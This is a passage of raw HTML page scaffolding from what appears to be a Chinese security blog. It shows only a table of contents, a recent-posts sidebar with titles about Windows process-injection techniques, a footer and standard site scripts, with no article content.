class="toc-number">1.2.</span> <span class="toc-text">2.如何利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">3.注入方法的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">4.代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.5.</span> <span class="toc-text">补充</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/05/web%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" title="No title">No title</a><time datetime="2023-09-05T10:00:44.585Z" title="Created 2023-09-05 18:00:44">2023-09-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/24/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-24T09:38:28.729Z" title="Created 2023-07-24 17:38:28">2023-07-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/21/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-21T08:06:00.154Z" title="Created 2023-07-21 16:06:00">2023-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/20/APC%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-20T11:08:18.081Z" title="Created 2023-07-20 19:08:18">2023-07-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/18/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5--%E7%AA%81%E7%A0%B4session0%E6%B3%A8%E5%85%A5/" title="No title">No title</a><time datetime="2023-07-18T06:58:55.699Z" title="Created 2023-07-18 14:58:55">2023-07-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
